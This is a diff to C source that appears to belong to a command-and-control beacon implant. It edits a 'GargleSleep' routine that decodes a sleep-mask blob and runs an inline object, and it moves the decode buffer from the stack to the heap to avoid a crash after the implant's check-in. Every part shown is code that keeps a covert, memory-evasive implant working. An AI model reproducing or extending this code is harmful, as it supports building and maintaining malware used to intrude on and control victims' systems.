@@ -8,6 +8,7 @@
 #include "datastore.h"
 #include "parse.h"
 #include "x86trace.h"
+#include <stdlib.h>
 
 
 typedef void(*GARGLEF)(GARGLEP * parms, void (__stdcall *Sleep)(DWORD), DWORD time);
@@ -122,16 +123,24 @@ void GargleSleep(DWORD time) {
 #if !defined(_M_IX86)
 	GARGLEF func;
 #endif
-	char decoded[16384];
+	char * decoded;
 	int dlen;
 
+	/* nook=0 (sleep_mask false) is Sleep(). Do not allocate the 16KB decode
+	 * buffer on the stack — x86 BeaconLoader threads + MSVC __chkstk probe
+	 * of 16KB is the first large frame after the checkin GET. */
 	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0) {
 		x86_bc("GargleSleep Sleep() nook=0");
 		Sleep(time);
 		return;
 	}
 
-	dlen = sleepmask_decode(decoded, (int)sizeof(decoded));
+	decoded = (char *)malloc(16384);
+	if (decoded == NULL) {
+		Sleep(time);
+		return;
+	}
+	dlen = sleepmask_decode(decoded, 16384);
 	if (dlen > 16) {
 		datap parser;
 		DWORD entry;
@@ -150,8 +159,10 @@ void GargleSleep(DWORD time) {
 		entry = data_int(&parser);
 		be_time = htonl(time);
 		command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time));
+		free(decoded);
 		return;
 	}
+	free(decoded);
 
 #if defined(_M_IX86)
 	/* 4.5 trampoline body is INT3 placeholders. x86 must not execute it. */
